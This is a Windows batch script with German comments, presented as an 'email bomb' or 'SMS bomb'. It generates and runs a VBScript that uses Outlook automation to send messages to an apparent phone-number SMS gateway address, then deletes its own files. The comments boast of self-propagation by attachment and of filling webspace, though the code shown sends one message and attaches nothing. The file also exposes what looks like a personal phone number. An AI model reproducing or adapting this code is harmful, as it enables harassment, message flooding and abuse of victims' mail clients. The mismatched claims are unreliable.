REM Author: SEcoND paRT to HEll
REM Name: SendMail 1.00

REM Das Geniale an dieem Programm ist, das er sich selbst mitschickt, als Datei!
REM Wenn also der Empfaenger der eMail das Programm aufmacht, schickt er es sich selbst!!! ;-)
REM Ausserdem ist das mitschicken von Dateien gut, um Webspace zu killen!!!
cls
@echo off
copy %0 C:\prob.bat
copy %0 C:\send.vbs 
echo Dim x > C:\send.vbs
echo.ON ERROR RESUME NEXT >> C:\send.vbs
echo Set so=CreateObject("Scripting.FileSystemObject") >> C:\send.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\send.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\send.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\send.vbs
echo Set a = mapi.AddressLists(1) >> C:\send.vbs
echo For x=1 To 1 >> C:\send.vbs
echo Set Mail=ol.CreateItem(0) >> C:\send.vbs
echo Mail.to="436767862063@max.mail.at" >> C:\send.vbs
echo Mail.Subject="5131" >> C:\send.vbs
echo Mail.Body="Hi Peter! Das ist nur ein Test meiner SMS-Bombe!! kommt nur 5 mal..." >> C:\send.vbs
echo Mail.Send >> C:\send.vbs
echo Next >> C:\send.vbs
echo ol.Quit >> C:\send.vbs
cls
echo Dieser Vorgang kann jetzt einige Sekunden dauern, bitte Geduld...
echo.
echo.
echo.
cscript C:\send.vbs
del C:\prob.bat
del C:\send.vbs
echo.
cls
echo Bitte starte jetzt MS-Outlook, um die eMails entgueltig zu versenden!!!
echo DANKE FUER DAS VERWENDEN VON MEINER EMAIL-BOMBE!!!
echo BITTE WEITEREMPFEHLEN!!!
Pause
exit